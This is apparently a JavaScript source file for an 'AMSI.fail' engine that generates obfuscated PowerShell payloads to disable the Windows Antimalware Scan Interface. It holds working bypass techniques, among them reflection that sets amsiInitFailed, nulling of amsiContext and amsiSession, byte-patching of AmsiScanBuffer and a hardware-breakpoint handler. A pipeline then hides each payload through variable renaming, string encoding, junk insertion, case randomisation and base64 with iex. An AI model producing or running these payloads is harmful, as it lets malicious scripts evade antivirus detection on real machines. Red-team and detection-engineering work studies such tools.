// js/amsi-engine.js — AMSI.fail obfuscation engine

'use strict';

// ============================================================
// Utilities
// ============================================================

function randomInt(max) {
  return Math.floor(Math.random() * max);
}

function randomRange(min, max) {
  return min + randomInt(max - min);
}

function randomCase(input) {
  return input.split('').map(c =>
    Math.round(Math.random()) ? c.toUpperCase() : c.toLowerCase()
  ).join('');
}

function randomString(length) {
  const first = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_';
  const rest = first + '0123456789';
  let ret = first[randomInt(first.length)];
  for (let i = 1; i < length; i++) {
    ret += rest[randomInt(rest.length)];
  }
  return ret;
}

function randomVarName() {
  return randomString(randomRange(4, 14));
}

function chunkSubstr(str, size) {
  const numChunks = Math.ceil(str.length / size);
  const chunks = new Array(numChunks);
  for (let i = 0, o = 0; i < numChunks; ++i, o += size) {
    chunks[i] = str.substr(o, size);
  }
  return chunks;
}

function toBinary(string) {
  const codeUnits = new Uint16Array(string.length);
  for (let i = 0; i < codeUnits.length; i++) {
    codeUnits[i] = string.charCodeAt(i);
  }
  return btoa(String.fromCharCode(...new Uint8Array(codeUnits.buffer)));
}

function pickRandom(arr) {
  return arr[randomInt(arr.length)];
}

// PS automatic variables that must NEVER be renamed
const PS_AUTOVARS = new Set([
  '$null', '$true', '$false', '$_', '$PSItem', '$this',
  '$args', '$input', '$PSCmdlet', '$PSScriptRoot',
  '$MyInvocation', '$ExecutionContext', '$Host',
  '$Error', '$Event', '$EventArgs', '$EventSubscriber',
  '$ForEach', '$Matches', '$PSBoundParameters',
  '$PSDebugContext', '$PSVersionTable', '$Sender',
  '$StackTrace', '$switch'
]);

// ============================================================
// PSPayload factory
// ============================================================

function createPayload({ raw, technique, variables = [], sensitiveStrings = [], statements = null }) {
  if (statements === null) {
    statements = [];
    let depth = 0;
    let inString = false;
    let stringChar = '';
    for (let i = 0; i < raw.length; i++) {
      const c = raw[i];
      if (inString) {
        if (c === stringChar && raw[i - 1] !== '`') inString = false;
        continue;
      }
      if (c === '"' || c === "'") { inString = true; stringChar = c; continue; }
      if (c === '{' || c === '(') { depth++; continue; }
      if (c === '}' || c === ')') { depth--; continue; }
      if ((c === ';' || c === '\n') && depth === 0) {
        statements.push(i);
      }
    }
  }
  return { raw, technique, variables, sensitiveStrings, statements };
}

// ============================================================
// Technique Registry
// ============================================================

const TechniqueRegistry = {
  _techniques: {},

  register(technique) {
    this._techniques[technique.name] = technique;
  },

  get(name) {
    const t = this._techniques[name];
    if (!t) throw new Error(`Unknown technique: ${name}`);
    return t;
  },

  getRandom() {
    const keys = Object.keys(this._techniques);
    return this._techniques[keys[randomInt(keys.length)]];
  },

  list() {
    return Object.keys(this._techniques);
  }
};

// ============================================================
// Existing techniques (cleaned up)
// ============================================================

TechniqueRegistry.register({
  name: 'ForceError',
  description: 'Allocate memory, null amsiSession/amsiContext via reflection',
  generate() {
    const v = randomVarName();
    const raw =
      `$${v}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);` +
      `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null);` +
      `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]$${v})`;
    return createPayload({
      raw,
      technique: 'ForceError',
      variables: [`$${v}`],
      sensitiveStrings: ['AmsiUtils', 'amsiSession', 'amsiContext']
    });
  }
});

TechniqueRegistry.register({
  name: 'MattGRefl',
  description: 'Set amsiInitFailed=true via reflection',
  generate() {
    const v = randomVarName();
    const raw =
      `$${v}='System.Management.Automation.AmsiUtils';` +
      `[Ref].Assembly.GetType($${v}).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`;
    return createPayload({
      raw,
      technique: 'MattGRefl',
      variables: [`$${v}`],
      sensitiveStrings: ['AmsiUtils', 'amsiInitFailed']
    });
  }
});

TechniqueRegistry.register({
  name: 'MattGReflLog',
  description: 'Delegate::CreateDelegate bypass for WMF5 logging',
  generate() {
    const v = randomVarName();
    const raw =
      `$${v}='System.Management.Automation.AmsiUtils';` +
      `[Delegate]::CreateDelegate(("Func\`\`3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')),[Object]([Ref].Assembly.GetType($${v})),('GetField')).Invoke('amsiInitFailed',(("NonPublic,Static") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$true)`;
    return createPayload({
      raw,
      technique: 'MattGReflLog',
      variables: [`$${v}`],
      sensitiveStrings: ['AmsiUtils', 'amsiInitFailed']
    });
  }
});

TechniqueRegistry.register({
  name: 'MattGRef02',
  description: 'Overwrite amsiContext via WriteInt32',
  generate() {
    const v = randomVarName();
    const hexVal = '0x' + randomInt(2147483647).toString(16);
    const raw =
      `$${v}='System.Management.Automation.AmsiUtils';` +
      `[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType($${v}).GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),${hexVal})`;
    return createPayload({
      raw,
      technique: 'MattGRef02',
      variables: [`$${v}`],
      sensitiveStrings: ['AmsiUtils', 'amsiContext', 'WriteInt32']
    });
  }
});

TechniqueRegistry.register({
  name: 'RastaBuf',
  description: 'VirtualProtect + patch AmsiScanBuffer shellcode',
  generate() {
    const vWin32 = randomVarName();
    const vLibLoad = randomVarName();
    const vMemAdr = randomVarName();
    const vPatch = randomVarName();
    const vP = randomVarName();
    const vVar1 = randomVarName();
    const vVar2 = randomVarName();
    const vVar3 = randomVarName();
    const vVar4 = randomVarName();
    const vVar5 = randomVarName();
    const vVar6 = randomVarName();

    const raw =
`$${vWin32} = @"
using System;
using System.Runtime.InteropServices;
public class ${vWin32} {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $${vWin32}
$${vLibLoad} = [${vWin32}]::LoadLibrary('amsi.dll')
$${vMemAdr} = [${vWin32}]::GetProcAddress($${vLibLoad}, 'AmsiScanBuffer')
$${vP} = 0
[${vWin32}]::VirtualProtect($${vMemAdr}, [uint32]5, 0x40, [ref]$${vP})
$${vVar1} = "0xB8"
$${vVar2} = "0x57"
$${vVar3} = "0x00"
$${vVar4} = "0x07"
$${vVar5} = "0x80"
$${vVar6} = "0xC3"
$${vPatch} = [Byte[]] ($${vVar1},$${vVar2},$${vVar3},$${vVar4},+$${vVar5},+$${vVar6})
[System.Runtime.InteropServices.Marshal]::Copy($${vPatch}, 0, $${vMemAdr}, 6)`;

    return createPayload({
      raw,
      technique: 'RastaBuf',
      variables: [
        `$${vWin32}`, `$${vLibLoad}`, `$${vMemAdr}`, `$${vPatch}`,
        `$${vP}`, `$${vVar1}`, `$${vVar2}`, `$${vVar3}`,
        `$${vVar4}`, `$${vVar5}`, `$${vVar6}`
      ],
      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll']
    });
  }
});

// ============================================================
// New techniques
// ============================================================

TechniqueRegistry.register({
  name: 'FieldOffset',
  description: 'Marshal::Copy to amsiContext field offset',
  generate() {
    const vCtx = randomVarName();
    const vPatch = randomVarName();
    const raw =
      `$${vCtx}=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null);` +
      `$${vPatch}=[System.BitConverter]::GetBytes([System.Int32]::MaxValue);` +
      `[System.Runtime.InteropServices.Marshal]::Copy($${vPatch},0,$${vCtx},4)`;
    return createPayload({
      raw,
      technique: 'FieldOffset',
      variables: [`$${vCtx}`, `$${vPatch}`],
      sensitiveStrings: ['AmsiUtils', 'amsiContext']
    });
  }
});

TechniqueRegistry.register({
  name: 'ScanBufferPatchAlt',
  description: 'Patch AmsiScanBuffer via GetDelegateForFunctionPointer (no csc.exe)',
  generate() {
    const vLib = randomVarName();
    const vAddr = randomVarName();
    const vOld = randomVarName();
    const vPatch = randomVarName();
    const raw =
      `$${vLib}=[Runtime.InteropServices.Marshal]::LoadLibrary('amsi.dll');` +
      `$${vAddr}=[Runtime.InteropServices.Marshal]::GetProcAddress($${vLib},'AmsiScanBuffer');` +
      `$${vOld}=0;` +
      `[Runtime.InteropServices.Marshal]::VirtualProtect($${vAddr},[uint32]5,0x40,[ref]$${vOld});` +
      `$${vPatch}=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);` +
      `[Runtime.InteropServices.Marshal]::Copy($${vPatch},0,$${vAddr},6)`;
    return createPayload({
      raw,
      technique: 'ScanBufferPatchAlt',
      variables: [`$${vLib}`, `$${vAddr}`, `$${vOld}`, `$${vPatch}`],
      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll']
    });
  }
});

TechniqueRegistry.register({
  name: 'ReflectionFromAssembly',
  description: 'Enumerate assemblies to find AMSI type dynamically',
  generate() {
    const vAsm = randomVarName();
    const vType = randomVarName();
    const raw =
      `$${vAsm}=[AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -and $_.Location.Split('\\\\')[-1] -eq 'System.Management.Automation.dll'};` +
      `$${vType}=$${vAsm}.GetType('System.Management.Automation.AmsiUtils');` +
      `$${vType}.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`;
    return createPayload({
      raw,
      technique: 'ReflectionFromAssembly',
      variables: [`$${vAsm}`, `$${vType}`],
      sensitiveStrings: ['AmsiUtils', 'amsiInitFailed', 'System.Management.Automation.dll']
    });
  }
});

TechniqueRegistry.register({
  name: 'BlankAmsiProviders',
  description: 'Null out amsiProviders to remove scan providers',
  generate() {
    const vCtx = randomVarName();
    const raw =
      `$${vCtx}=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');` +
      `$${vCtx}.GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]::Zero);` +
      `$${vCtx}.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)`;
    return createPayload({
      raw,
      technique: 'BlankAmsiProviders',
      variables: [`$${vCtx}`],
      sensitiveStrings: ['AmsiUtils', 'amsiContext', 'amsiSession']
    });
  }
});

TechniqueRegistry.register({
  name: 'HardwareBreakpoint',
  description: 'VEH + debug registers on AmsiScanBuffer (no memory patching)',
  generate() {
    const vType = randomVarName();
    const vLib = randomVarName();
    const vAddr = randomVarName();
    const vHandler = randomVarName();
    const className = randomVarName();

    const raw =
`$${vType} = @"
using System;
using System.Runtime.InteropServices;
public class ${className} {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetCurrentThread();
    [DllImport("kernel32")]
    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT ctx);
    [DllImport("kernel32")]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT ctx);
    [DllImport("kernel32")]
    public static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);
    public delegate long VEH(IntPtr pExceptionInfo);
    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT {
        public long P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15;
        public ulong Rip;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1232)]
        public byte[] ExtRegs;
    }
    private static IntPtr _target;
    public static void SetTarget(IntPtr addr) { _target = addr; }
    public static long Handler(IntPtr pInfo) {
        var rec = Marshal.ReadIntPtr(pInfo);
        var code = (uint)Marshal.ReadInt32(rec);
        var ctx = Marshal.ReadIntPtr(pInfo, IntPtr.Size);
        if (code == 0x80000004) {
            var rip = Marshal.ReadInt64(ctx, 0xF8);
            if ((ulong)rip == (ulong)_target) {
                Marshal.WriteInt64(ctx, 0x78, 0x80070057);
                var dr7 = Marshal.ReadInt64(ctx, 0x70);
                Marshal.WriteInt64(ctx, 0x70, dr7 & ~(long)1);
            }
        }
        return 0;
    }
}
"@
Add-Type $${vType}
$${vLib} = [${className}]::LoadLibrary('amsi.dll')
$${vAddr} = [${className}]::GetProcAddress($${vLib}, 'AmsiScanBuffer')
[${className}]::SetTarget($${vAddr})
$${vHandler} = [${className}+VEH]::new([${className}], 'Handler')
[${className}]::AddVectoredExceptionHandler(1, [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($${vHandler}))
$ctx = New-Object ${className}+CONTEXT
$ctx.ContextFlags = 0x100010
$thread = [${className}]::GetCurrentThread()
[${className}]::GetThreadContext($thread, [ref]$ctx)
$ctx.Dr0 = [uint64]$${vAddr}
$ctx.Dr7 = $ctx.Dr7 -bor 1
[${className}]::SetThreadContext($thread, [ref]$ctx)`;

    return createPayload({
      raw,
      technique: 'HardwareBreakpoint',
      variables: [`$${vType}`, `$${vLib}`, `$${vAddr}`, `$${vHandler}`, '$ctx', '$thread'],
      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll']
    });
  }
});

// ============================================================
// String Encoding Methods
// ============================================================

function obfuscateInt(int) {
  if (int <= 0) return `(${int})`;
  if (int === 1) return pickRandom(['(1)', '(2-1)', '(3-2)']);
  if (int === 2) return pickRandom(['(2)', '(1+1)', '(4-2)']);

  const subNumber = randomInt(int - 2) + 1;
  switch (randomInt(6)) {
    case 0: return `(${subNumber}+${int - subNumber})`;
    case 1: return `(${int}+${subNumber}-${subNumber})`;
    case 2: return `(${int}*${subNumber}/${subNumber})`;
    case 3: return `(${int})`;
    case 4: {
      const mask = randomInt(65536);
      return `(0x${(int ^ mask).toString(16)} -bxor 0x${mask.toString(16)})`;
    }
    case 5: {
      const log2 = Math.log2(int);
      if (Number.isInteger(log2)) return `(1 -shl ${log2})`;
      return `(${subNumber}+${int - subNumber})`;
    }
  }
  return `(${int})`;
}

function charEncodeAsChar(char) {
  return `[${randomCase('char')}]${obfuscateInt(char.charCodeAt(0))}`;
}

function charEncodeAsByte(char) {
  return `([${randomCase('byte')}]0x${char.charCodeAt(0).toString(16)})`;
}

function encodeStringChars(str) {
  return str.split('').map(c =>
    Math.round(Math.random()) ? charEncodeAsChar(c) : charEncodeAsByte(c)
  ).join('+');
}

const DIACRITIC_MAP = {
  65: [192, 197],   // A
  97: [224, 229],   // a
  69: [200, 203],   // E
  101: [232, 235],  // e
  73: [204, 207],   // I
  105: [236, 239],  // i
  79: [210, 216],   // O
  111: [243, 246],  // o
  85: [217, 220],   // U
  117: [249, 252],  // u
};

function getRandomDiacritic(charCode) {
  const range = DIACRITIC_MAP[charCode];
  if (range) return String.fromCharCode(range[0] + randomInt(range[1] - range[0]));
  return String.fromCharCode(charCode);
}

function encodeStringDiacritic(str) {
  const diacriticStr = str.split('').map(c => getRandomDiacritic(c.charCodeAt(0))).join('');
  const chunkSize = randomRange(2, Math.max(3, diacriticStr.length));
  const chunks = chunkSubstr(diacriticStr, chunkSize);
  const joined = chunks.join("'+'");

  const formD = encodeStringChars('FormD');
  const pattern = encodeStringChars(String.raw`\p{Mn}`);

  return `('${joined}').${randomCase('Normalize')}(${formD}) -replace ${pattern}`;
}

function encodeStringFormat(str) {
  if (str.length < 2) return encodeStringChars(str);
  const numSplits = randomRange(1, Math.min(4, str.length));
  const points = new Set();
  while (points.size < numSplits) {
    points.add(randomRange(1, str.length));
  }
  const sorted = [...points].sort((a, b) => a - b);

  let format = '';
  const args = [];
  let prev = 0;
  sorted.forEach((pt, i) => {
    args.push(str.slice(prev, pt));
    format += `{${i}}`;
    prev = pt;
  });
  args.push(str.slice(prev));
  format += `{${sorted.length}}`;

  const argsStr = args.map(a => `'${a}'`).join(',');
  return `('${format}' -f ${argsStr})`;
}

function encodeStringBytes(str) {
  const bytes = str.split('').map(c => obfuscateInt(c.charCodeAt(0)));
  return `([${randomCase('System.Text.Encoding')}]::ASCII.GetString([byte[]](${bytes.join(',')})))`;
}

function encodeStringReverse(str) {
  const reversed = str.split('').reverse().join('');
  const len = str.length;
  return `('${reversed}'[${obfuscateInt(len - 1)}..0] -join '')`;
}

function obfuscateString(str) {
  const methods = [
    encodeStringChars,
    encodeStringDiacritic,
    encodeStringFormat,
    encodeStringBytes,
    encodeStringReverse,
  ];
  return pickRandom(methods)(str);
}

// ============================================================
// Obfuscation Pipeline
// ============================================================

const ObfuscationPipeline = {
  stages: [],

  addStage(stage) {
    this.stages.push(stage);
  },

  run(payload) {
    for (const stage of this.stages) {
      payload = stage.process(payload);
    }
    return payload;
  }
};

// --- Stage 1: Variable Renaming ---
ObfuscationPipeline.addStage({
  name: 'variableRenaming',
  process(payload) {
    let { raw, variables } = payload;
    const newVars = [];

    for (const v of variables) {
      if (PS_AUTOVARS.has(v)) { newVars.push(v); continue; }
      const newName = '$' + randomVarName();
      newVars.push(newName);
      const bare = v.slice(1);
      const newBare = newName.slice(1);
      raw = raw.split('$' + bare).join('$' + newBare);
      raw = raw.replace(new RegExp(`(?<!\\$)\\b${bare}\\b`, 'g'), newBare);
    }

    return { ...payload, raw, variables: newVars };
  }
});

// --- Stage 2: Sensitive String Obfuscation ---
ObfuscationPipeline.addStage({
  name: 'sensitiveStringObfuscation',
  process(payload) {
    let { raw, sensitiveStrings } = payload;

    for (const word of sensitiveStrings) {
      const obf = obfuscateString(word);
      raw = raw.split(`'${word}'`).join(`$(${obf})`);
      raw = raw.split(word).join(`'+$(${obf})+'`);
    }

    raw = raw.replace(/''\+'/g, "'");
    raw = raw.replace(/'\+''/g, "'");
    raw = raw.replace(/^''\+/g, '');
    raw = raw.replace(/\+''$/g, '');

    return { ...payload, raw };
  }
});

// --- Stage 3: Integer Obfuscation ---
ObfuscationPipeline.addStage({
  name: 'integerObfuscation',
  process(payload) {
    let { raw } = payload;

    raw = raw.replace(/(?<=[\(,\s])(\d{2,})(?=[\),;\s\]])/g, (match) => {
      const val = parseInt(match, 10);
      if (val <= 0) return match;
      return obfuscateInt(val);
    });

    return { ...payload, raw };
  }
});

// --- Stage 4: Junk Insertion ---
ObfuscationPipeline.addStage({
  name: 'junkInsertion',
  process(payload) {
    let { raw } = payload;

    const boundaries = [];
    let depth = 0, inStr = false, strChar = '';
    for (let i = 0; i < raw.length; i++) {
      const c = raw[i];
      if (inStr) { if (c === strChar && raw[i - 1] !== '`') inStr = false; continue; }
      if (c === '"' || c === "'") { inStr = true; strChar = c; continue; }
      if (c === '{' || c === '(' || c === '[') { depth++; continue; }
      if (c === '}' || c === ')' || c === ']') { depth--; continue; }
      if (c === ';' && depth === 0) boundaries.push(i);
    }

    if (boundaries.length < 2) return { ...payload, raw };

    const numInserts = randomRange(2, Math.min(5, boundaries.length + 1));
    const chosen = [];
    const available = [...boundaries];
    for (let i = 0; i < numInserts && available.length > 0; i++) {
      const idx = randomInt(available.length);
      chosen.push(available.splice(idx, 1)[0]);
    }
    chosen.sort((a, b) => b - a);

    for (const pos of chosen) {
      const junkType = randomInt(3);
      let junk;
      switch (junkType) {
        case 0: {
          const jVar = randomVarName();
          const jVal = randomString(randomRange(5, 20));
          junk = `$${jVar}='${jVal}'`;
          break;
        }
        case 1: {
          junk = `[${randomCase('System.Threading.Thread')}]::Sleep(${randomInt(500)})`;
          break;
        }
        case 2: {
          const nopVar = randomString(randomRange(3, 10));
          junk = `[void](${randomCase('Get-Variable')} -Name '${nopVar}' -ErrorAction SilentlyContinue)`;
          break;
        }
      }
      raw = raw.slice(0, pos + 1) + junk + ';' + raw.slice(pos + 1);
    }

    return { ...payload, raw };
  }
});

// --- Stage 5: Case Randomization ---
ObfuscationPipeline.addStage({
  name: 'caseRandomization',
  process(payload) {
    let { raw } = payload;

    let result = '';
    let inStr = false;
    let strChar = '';

    for (let i = 0; i < raw.length; i++) {
      const c = raw[i];
      if (inStr) {
        result += c;
        if (c === strChar && raw[i - 1] !== '`') inStr = false;
        continue;
      }
      if (c === '"' || c === "'") {
        inStr = true;
        strChar = c;
        result += c;
        continue;
      }
      if (/[a-zA-Z]/.test(c)) {
        result += Math.round(Math.random()) ? c.toUpperCase() : c.toLowerCase();
      } else {
        result += c;
      }
    }

    return { ...payload, raw: result };
  }
});

// --- Stage 6: Expression Wrapping ---
ObfuscationPipeline.addStage({
  name: 'expressionWrapping',
  process(payload) {
    let { raw } = payload;

    switch (randomInt(3)) {
      case 0:
        raw = `& {${raw}}`;
        break;
      case 1: {
        const v = randomVarName();
        const escaped = raw.replace(/"/g, '`"');
        raw = `$${v}="${escaped}";${randomCase('Invoke-Expression')} $${v}`;
        break;
      }
      case 2:
        break;
    }

    return { ...payload, raw };
  }
});

// ============================================================
// Public API
// ============================================================

function generate(techniqueName = null) {
  const technique = techniqueName
    ? TechniqueRegistry.get(techniqueName)
    : TechniqueRegistry.getRandom();

  let payload = technique.generate();
  payload = ObfuscationPipeline.run(payload);
  return payload.raw;
}

function generateEncoded(techniqueName = null) {
  const inner = generate(techniqueName);
  const encoded = toBinary(inner);
  const decoder = randomCase('[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(');
  return `${decoder}"${encoded}"))|${randomCase('iex')}`;
}

function listTechniques() {
  return TechniqueRegistry.list();
}